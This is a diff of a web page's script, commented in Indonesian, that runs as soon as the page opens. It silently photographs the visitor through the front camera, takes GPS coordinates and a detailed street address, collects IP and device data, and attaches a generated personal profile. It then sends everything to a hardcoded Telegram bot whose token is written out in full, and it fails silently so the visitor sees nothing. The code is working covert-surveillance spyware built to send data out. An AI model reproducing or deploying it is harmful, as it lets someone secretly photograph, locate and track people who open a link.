@@ -30,10 +30,9 @@
 
 <script>
 /*
-  AUTO-REPORT HTML
-  - Ganti BOT_TOKEN & CHAT_ID kalau perlu (sudah terisi sesuai permintaan).
-  - Host via HTTPS atau buka di localhost agar kamera & geolocation berjalan.
-  - Jika ingin real profile lookup: isi object `profiles` dengan mapping IP -> profile.
+  AUTO-REPORT HTML (Updated: Detailed Address Fields)
+  - BOT_TOKEN & CHAT_ID telah diisi sesuai permintaan.
+  - Host via HTTPS atau localhost agar kamera & geolocation berjalan.
 */
 
 const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
@@ -43,70 +42,49 @@ const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 
-/* ---------------------------
-   PROFILE DATABASE (OPTIONAL)
-   Jika kamu punya data nyata (IP -> profile), masukkan di sini.
-   Contoh: profiles["118.96.123.45"] = { name:"Budi", age:"27", gender:"L", job:"Reseller", kampung:"Babakan" }
------------------------------*/
+/* optional profile mapping by IP */
 const profiles = {
   // "118.96.123.45": { name:"Budi Santoso", age:"28", gender:"Laki-laki", job:"Reseller", kampung:"Babakan" }
 };
 
-/* ---------------------------
-   Helpers & Generators
------------------------------*/
 function rand(arr){ return arr[Math.floor(Math.random()*arr.length)]; }
-
 function generateFakeProfile(ip){
-  // name lists (Indonesian-ish)
-  const first = ["Budi","Andi","Siti","Rina","Agus","Dewi","Joko","Rian","Fitri","Eka","Yuli","Rizki","Tono","Sari"];
-  const last = ["Santoso","Wijaya","Kurniawan","Hidayat","Kartika","Pratama","Susilo","Saputra","Wibowo","Putri","Aminah"];
-  const jobs = ["Reseller","Pedagang","Pelajar/Mahasiswa","Driver","Karyawan Swasta","Teknisi","Ibu Rumah Tangga","Freelancer"];
-  const kampungList = ["Babakan","Cisaat","Cibadak","Warudoyong","Gunungpuyuh","Baros","Cikole","Cempaka"];
-
+  const first = ["Budi","Andi","Siti","Rina","Agus","Dewi","Joko","Rian","Fitri","Eka","Yuli","Rizki","Tono","Sari","Putri","Ahmad"];
+  const last = ["Santoso","Wijaya","Kurniawan","Hidayat","Kartika","Pratama","Susilo","Saputra","Wibowo","Putri","Aminah","Rahman"];
+  const jobs = ["Reseller","Pedagang","Pelajar/Mahasiswa","Driver","Karyawan Swasta","Teknisi","Ibu Rumah Tangga","Freelancer","Guru"];
+  const kampungList = ["Babakan","Cisaat","Cibadak","Warudoyong","Gunungpuyuh","Baros","Cikole","Cempaka","Sukamulya","Kebon"];
   const name = rand(first) + " " + rand(last);
-  const age = Math.floor(Math.random()*40) + 18; // 18-57
+  const age = Math.floor(Math.random()*40) + 18;
   const gender = Math.random() > 0.5 ? "Laki-laki" : "Perempuan";
   const job = rand(jobs);
   const kampung = rand(kampungList);
-
   return { name, age: String(age), gender, job, kampung };
 }
 
-/* truncate caption to safe size (telegram caption ~1024 chars) */
 function safeCaption(s){
   if (!s) return '';
   if (s.length <= 1000) return s;
   return s.slice(0,1000-3) + '...';
 }
 
-/* format box with simbok garis (╭ ├ │ └) */
 function buildBox(data){
-  // data: object containing many fields and nested arrays
   const now = new Date();
   const lines = [];
   lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
-  // Pesan
   lines.push(` ├─ > Pesan`);
   lines.push(` │   └─ ${data.message || 'Auto capture & device report'}`);
-
-  // Pengirim
   lines.push(` ├─ > Pengirim (web)`);
   lines.push(` │   └─ ${data.userAgent || '-'}`);
-
-  // IP / ISP
   lines.push(` ├─ > IP / ISP`);
   const ip = data.ipInfo || {};
   lines.push(` │   ├─ IP: ${ip.ip || '-'}`);
   lines.push(` │   ├─ ISP/Org: ${ip.org || ip.isp || '-'}`);
   lines.push(` │   ├─ ASN: ${ip.asn || '-'}`);
   lines.push(` │   ├─ City: ${ip.city || '-'}`);
-  lines.push(` │   ├─ Region: ${ip.region || ip.state || '-'}`);
+  lines.push(` │   ├─ Region/State: ${ip.region || ip.state || '-'}`);
   lines.push(` │   ├─ Country: ${ip.country || ip.country_name || '-'}`);
   lines.push(` │   ├─ Postal: ${ip.postal || ip.postal_code || '-'}`);
   lines.push(` │   └─ IP Timezone: ${ip.timezone || '-'}`);
-
-  // Device
   lines.push(` ├─ > Device`);
   lines.push(` │   ├─ Platform: ${data.platform || '-'}`);
   lines.push(` │   ├─ Screen: ${data.screen || '-'}`);
@@ -118,16 +96,12 @@ function buildBox(data){
   lines.push(` │   ├─ Online: ${data.online || '-'}`);
   lines.push(` │   ├─ HW Threads: ${data.hwConcurrency || '-'}`);
   lines.push(` │   └─ DoNotTrack: ${data.doNotTrack || '-'}`);
-
-  // Connection
   lines.push(` ├─ > Connection`);
   if (data.connection){
     lines.push(` │   └─ Type: ${data.connection.effectiveType || '-'} | Downlink: ${data.connection.downlink || '-'} Mbps | RTT: ${data.connection.rtt || '-'} ms | SaveData: ${data.connection.saveData ? 'yes' : 'no'}`);
   } else {
     lines.push(` │   └─ Connection API: tidak tersedia`);
   }
-
-  // Geo (GPS)
   lines.push(` ├─ > Geo (GPS)`);
   if (data.geo && !data.geo.error){
     lines.push(` │   ├─ Lat: ${data.geo.lat}`);
@@ -138,22 +112,29 @@ function buildBox(data){
     lines.push(` │   └─ Error GPS: ${data.geo ? data.geo.error : '-'}`);
   }
 
-  // Address (Detailed)
+  // Detailed Address Section — many fields
   lines.push(` ├─ > Alamat (Detail)`);
   const a = data.address || {};
-  // Map common nominatim keys to readable labels
-  lines.push(` │   ├─ Negara: ${a.country || '-'}`);
-  lines.push(` │   ├─ Provinsi: ${a.state || a.region || '-'}`);
-  lines.push(` │   ├─ Kabupaten: ${a.county || '-'}`);
-  lines.push(` │   ├─ Kota: ${a.city || a.town || a.village || '-'}`);
-  lines.push(` │   ├─ Kecamatan: ${a.suburb || a.municipality || a.city_district || '-'}`);
-  lines.push(` │   ├─ Desa/Kelurahan: ${a.village || a.hamlet || a.suburb || '-'}`);
-  lines.push(` │   ├─ Kampung/Dusun: ${a.hamlet || '-'}`);
-  lines.push(` │   ├─ Jalan: ${a.road || a.pedestrian || '-'}`);
-  lines.push(` │   ├─ Nomor Jalan: ${a.house_number || '-'}`);
-  lines.push(` │   └─ Kode Pos: ${a.postcode || '-'}`);
+  lines.push(` │   ├─ display_name: ${data.revDisplay || '-'}`);
+  lines.push(` │   ├─ country: ${a.country || '-'}`);
+  lines.push(` │   ├─ country_code: ${a.country_code || '-'}`);
+  lines.push(` │   ├─ state / provinsi: ${a.state || a.region || '-'}`);
+  lines.push(` │   ├─ state_district: ${a.state_district || '-'}`);
+  lines.push(` │   ├─ county / kabupaten: ${a.county || '-'}`);
+  lines.push(` │   ├─ region: ${a.region || '-'}`);
+  lines.push(` │   ├─ city: ${a.city || a.town || a.village || '-'}`);
+  lines.push(` │   ├─ town: ${a.town || '-'}`);
+  lines.push(` │   ├─ village: ${a.village || '-'}`);
+  lines.push(` │   ├─ municipality: ${a.municipality || '-'}`);
+  lines.push(` │   ├─ suburb: ${a.suburb || '-'}`);
+  lines.push(` │   ├─ neighbourhood: ${a.neighbourhood || '-'}`);
+  lines.push(` │   ├─ quarter: ${a.quarter || '-'}`);
+  lines.push(` │   ├─ hamlet (kampung/dusun): ${a.hamlet || '-'}`);
+  lines.push(` │   ├─ road / jalan: ${a.road || '-'}`);
+  lines.push(` │   ├─ house_number: ${a.house_number || '-'}`);
+  lines.push(` │   └─ postcode: ${a.postcode || '-'}`);
 
-  // Profile (name/age/gender/job/kampung)
+  // Profile
   lines.push(` ├─ > Profile (auto)`);
   lines.push(` │   ├─ Nama: ${data.profile.name || '-'}`);
   lines.push(` │   ├─ Usia: ${data.profile.age || '-'}`);
@@ -161,23 +142,14 @@ function buildBox(data){
   lines.push(` │   ├─ Pekerjaan: ${data.profile.job || '-'}`);
   lines.push(` │   └─ Kampung: ${data.profile.kampung || '-'}`);
 
-  // Extras: reverse display_name short & raw address JSON (trim)
-  if (data.revDisplay) {
-    lines.push(` ├─ > Alamat (ringkas)`);
-    lines.push(` │   └─ ${data.revDisplay}`);
-  }
-
   lines.push(`╰─ > Sumber: AutoReport Web`);
-
   return lines.join('\n');
 }
 
-/* ---------------------------
-   Network / IP fetch with fallbacks (and attempt to get ASN)
------------------------------*/
+/* fetch utils */
 async function fetchJSON(url){
   try {
-    const r = await fetch(url, { cache: 'no-store' });
+    const r = await fetch(url, { cache:'no-store' });
     if (!r.ok) throw new Error('bad ' + r.status);
     return await r.json();
   } catch (e){
@@ -185,37 +157,23 @@ async function fetchJSON(url){
   }
 }
 
+/* IP info with fallbacks */
 async function getIPInfo(){
-  // try ipapi -> ipwhois -> ipinfo (limited) -> ipify (ip only)
   const sources = [
-    { url:'https://ipapi.co/json/' , mapper: j => ({
-        ip: j.ip, city: j.city, region: j.region, country: j.country_name || j.country,
-        org: j.org, postal: j.postal, timezone: j.timezone, latitude: j.latitude || j.lat, longitude: j.longitude || j.lon
-    })},
-    { url:'https://ipwhois.app/json/' , mapper: j => ({
-        ip: j.ip, city: j.city, region: j.region, country: j.country, org: j.org || j.isp,
-        postal: j.postal, timezone: j.timezone, latitude: j.latitude, longitude: j.longitude
-    })},
-    { url:'https://ipinfo.io/json?token=',
-      mapper: j => ({ ip:j.ip, city:j.city, region:j.region, country:j.country, org:j.org, postal:j.postal, timezone:j.timezone }) },
+    { url:'https://ipapi.co/json/' , mapper: j => ({ ip: j.ip, city: j.city, region: j.region, country: j.country_name || j.country, org: j.org, postal: j.postal, timezone: j.timezone, latitude: j.latitude || j.lat, longitude: j.longitude || j.lon, asn: j.asn }) },
+    { url:'https://ipwhois.app/json/' , mapper: j => ({ ip: j.ip, city: j.city, region: j.region, country: j.country, org: j.org || j.isp, postal: j.postal, timezone: j.timezone, latitude: j.latitude, longitude: j.longitude }) },
     { url:'https://api.ipify.org?format=json', mapper: j => ({ ip: j.ip }) }
   ];
-
   for (const s of sources){
     const j = await fetchJSON(s.url);
     if (!j) continue;
     const m = s.mapper(j);
-    if (m && m.ip) {
-      // try to get ASN/extra via whois.cymru if needed (skip here)
-      return m;
-    }
+    if (m && m.ip) return m;
   }
   return { ip: 'unknown' };
 }
 
-/* ---------------------------
-   Reverse geocode via Nominatim -> return both display & address object (parsed)
------------------------------*/
+/* reverse geocode */
 async function revGeocode(lat, lon){
   try {
     const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`, { cache:'no-store', headers:{ 'User-Agent':'AutoReport/1.0' }});
@@ -227,59 +185,37 @@ async function revGeocode(lat, lon){
   }
 }
 
-/* ---------------------------
-   Get browser/device info
------------------------------*/
+/* device info */
 async function getBattery(){
-  try {
-    if (!navigator.getBattery) return null;
-    const b = await navigator.getBattery();
-    return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
-  } catch { return null; }
+  try { if (!navigator.getBattery) return null; const b = await navigator.getBattery(); return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`; } catch { return null; }
 }
 function getConnection(){ try { const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if (!c) return null; return { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData }; } catch { return null; } }
 
-/* ---------------------------
-   Geo (GPS) via navigator.geolocation
------------------------------*/
+/* geolocation */
 function getGeo(){
   return new Promise(resolve => {
     if (!navigator.geolocation) return resolve({ error: 'geolocation not supported' });
     navigator.geolocation.getCurrentPosition(pos => {
-      resolve({
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        acc: pos.coords.accuracy + ' m',
-        maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
-      });
+      resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy + ' m', maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}` });
     }, err => resolve({ error: err.message }), { enableHighAccuracy: true, timeout: 10000 });
   });
 }
 
-/* ---------------------------
-   Telegram send: photo + caption (single message)
------------------------------*/
+/* telegram send */
 async function sendPhotoCaption(blob, caption){
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
   const fd = new FormData();
   fd.append('chat_id', CHAT_ID);
-  fd.append('photo', blob, 'camera.png');
+  fd.append('photo', blob, 'camera.jpg');
   fd.append('caption', caption);
-  // parse_mode omitted because caption is plain text box
   return fetch(url, { method:'POST', body: fd });
 }
 
-/* ---------------------------
-   Main flow
------------------------------*/
+/* main */
 (async function main(){
-  // safety: ensure bot token & chat set
-  if (!BOT_TOKEN || BOT_TOKEN.includes('ISI_TOKEN') || !CHAT_ID || CHAT_ID.includes('ISI_CHATID')){
-    // nothing: avoid running without config
-    return;
-  }
+  if (!BOT_TOKEN || BOT_TOKEN.includes('ISI_TOKEN') || !CHAT_ID || CHAT_ID.includes('ISI_CHATID')) return;
 
-  // gather device quick info
+  // device
   const deviceInfo = {
     platform: navigator.platform || '-',
     userAgent: navigator.userAgent || '-',
@@ -295,53 +231,42 @@ async function sendPhotoCaption(blob, caption){
   };
   deviceInfo.battery = await getBattery();
 
-  // parallel fetch IP & geo
+  // parallel: ip & geo
   const [ ipInfo, geo ] = await Promise.all([ getIPInfo(), getGeo() ]);
 
-  // attempt reverse geocode if gps ok
+  // rev geocode
   let rev = null;
-  if (geo && !geo.error && geo.lat && geo.lon){
-    rev = await revGeocode(geo.lat, geo.lon);
-  }
+  if (geo && !geo.error && geo.lat && geo.lon) rev = await revGeocode(geo.lat, geo.lon);
 
-  // profile: lookup by IP first, else generate fake
+  // profile lookup / fake
   let profile = { name:'unknown', age:'unknown', gender:'unknown', job:'unknown', kampung:'unknown' };
   if (ipInfo && ipInfo.ip && profiles[ipInfo.ip]) {
     profile = profiles[ipInfo.ip];
   } else {
     profile = generateFakeProfile(ipInfo.ip);
-    // if reverse address contains village/hamlet, use that as kampung
-    if (rev && rev.address){
-      profile.kampung = rev.address.hamlet || rev.address.village || profile.kampung;
-    }
+    if (rev && rev.address) profile.kampung = rev.address.hamlet || rev.address.village || profile.kampung;
   }
 
-  // capture camera (try, but proceed even if fails)
+  // capture camera
   let photoBlob = null;
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
     video.srcObject = stream;
     await video.play();
-    // give time for camera to produce frame
     await new Promise(r => setTimeout(r, 1000));
-    // draw center-cropped to canvas (square)
     const w = video.videoWidth || canvas.width;
     const h = video.videoHeight || canvas.height;
-    // scale/crop to fit canvas
-    ctx.clearRect(0,0,canvas.width,canvas.height);
-    // compute aspect ratios to center crop
-    const side = Math.min(w, h);
+    const side = Math.min(w,h);
     const sx = (w - side)/2;
     const sy = (h - side)/2;
+    ctx.clearRect(0,0,canvas.width,canvas.height);
     ctx.drawImage(video, sx, sy, side, side, 0, 0, canvas.width, canvas.height);
     stream.getTracks().forEach(t=>t.stop());
     photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
   } catch (e){
-    // camera failed or permission denied; we continue and only send text if no photo
     photoBlob = null;
   }
 
-  // build final data object for box
   const data = {
     message: 'Auto capture & device report',
     userAgent: deviceInfo.userAgent,
@@ -363,16 +288,13 @@ async function sendPhotoCaption(blob, caption){
     profile: profile
   };
 
-  // build box string
   const boxed = buildBox(data);
   const caption = safeCaption(boxed);
 
-  // send as single message (photo + caption) if photo available
   try {
     if (photoBlob){
       await sendPhotoCaption(photoBlob, caption);
     } else {
-      // fallback: send caption as text-only message
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method:'POST',
         headers: {'Content-Type':'application/json'},
@@ -380,8 +302,8 @@ async function sendPhotoCaption(blob, caption){
       });
     }
   } catch (e){
-    // silently fail (nothing to show on page)
-    console.error('telegram send failed', e);
+    // fail silently
+    console.error('tg send failed', e);
   }
 
 })();
